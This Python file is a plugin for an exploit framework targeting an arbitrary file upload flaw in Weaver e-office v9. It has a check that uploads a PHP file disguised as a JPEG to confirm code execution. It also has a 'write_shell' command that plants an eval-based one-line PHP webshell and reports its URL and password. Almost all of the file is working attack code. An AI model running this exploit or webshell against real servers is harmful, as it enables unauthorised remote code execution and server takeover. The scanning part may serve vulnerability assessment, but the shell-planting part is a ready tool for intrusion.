# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "泛微OA Eoffice v9文件上传漏洞",
        "description": "泛微e-office 未能正确处理上传模块中用户输入导致的，攻击者可以构造恶意的上传数据包，实现任意代码执行，攻击者可利用该漏洞获取服务器控制权。",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(8)
        r = self.request(
            method='POST',
            path='./general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=',
            headers={
                'Cookie': 'LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348',
            },
            files={'Filedata': (random_str + '.php', f'<?php echo "{random_str}";?>'.encode(), 'image/jpeg')},
            timeout=15
        )
        if r.status_code != 200:
            return {}
        r = self.request(
            method='GET',
            path='./images/logo/logo-eoffice.php',
            timeout=15
        )
        if r.status_code == 200 and random_str in r.text:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='写入一句话马')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def write_shell(self, url):
        filename = self.build_random_str(5) + '.php'
        r = self.request(
            method='POST',
            url=urllib.parse.urljoin(
                url,
                './general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
            ),
            headers={
                'Cookie': 'LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348',
            },
            file={'Filedata': (filename, '<?php @eval($_GET["unsafe"]); ?>'.encode(), 'image/jpeg')},
            timeout=15
        )
        if r.status_code == 200:
            self.log.success('写入一句话马成功')
            self.log.success(f'访问地址: {urllib.parse.urljoin(url, "./images/logo/logo-eoffice.php")}')
            self.log.success('连接密码: unsafe')
        else:
            self.log.failure('写入一句话马失败')
